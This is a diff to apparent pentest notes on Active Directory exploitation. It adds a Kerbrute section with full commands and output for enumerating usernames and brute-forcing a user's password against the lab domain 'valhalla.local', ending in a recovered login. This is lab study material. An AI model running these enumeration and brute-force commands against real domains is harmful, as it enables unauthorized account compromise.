@@ -89,7 +89,53 @@ This is a collection of notes about active directory and (post)exploitation
 	1000: THOR\win7 (SidTypeUser)
 
 
-## Password Bruteforce
+## Bruteforce
+
+
+
+### Kerbrute
+
+Brute force usernames from DC
+
+
+	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
+	└─$ ./kerbrute userenum --dc valhalla.local -d valhalla.local /usr/share/wordlists/metasploit/unix_users.txt
+
+		__             __               __     
+	   / /_____  _____/ /_  _______  __/ /____ 
+	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+	Version: v1.0.3 (9dad6e1) - 08/19/21 - Ronnie Flathers @ropnop
+
+	2021/08/19 10:47:44 >  Using KDC(s):
+	2021/08/19 10:47:44 >   valhalla.local:88
+
+	2021/08/19 10:47:44 >  [+] VALID USERNAME:       administrator@valhalla.local
+	2021/08/19 10:47:44 >  Done! Tested 167 usernames (1 valid) in 0.065 seconds
+
+
+
+Bruteforce password for single user
+
+	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
+	└─$ ./kerbrute bruteuser -d valhalla.local --dc valhalla.local 500.txt testuser   
+
+		__             __               __     
+	   / /_____  _____/ /_  _______  __/ /____ 
+	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+	Version: v1.0.3 (9dad6e1) - 08/19/21 - Ronnie Flathers @ropnop
+
+	2021/08/19 10:46:17 >  Using KDC(s):
+	2021/08/19 10:46:17 >   valhalla.local:88
+
+	2021/08/19 10:46:18 >  [+] VALID LOGIN:  testuser@valhalla.local:Pass123!
+	2021/08/19 10:46:18 >  Done! Tested 500 logins (1 successes) in 1.019 seconds
+
 
 ### Metasploit
 
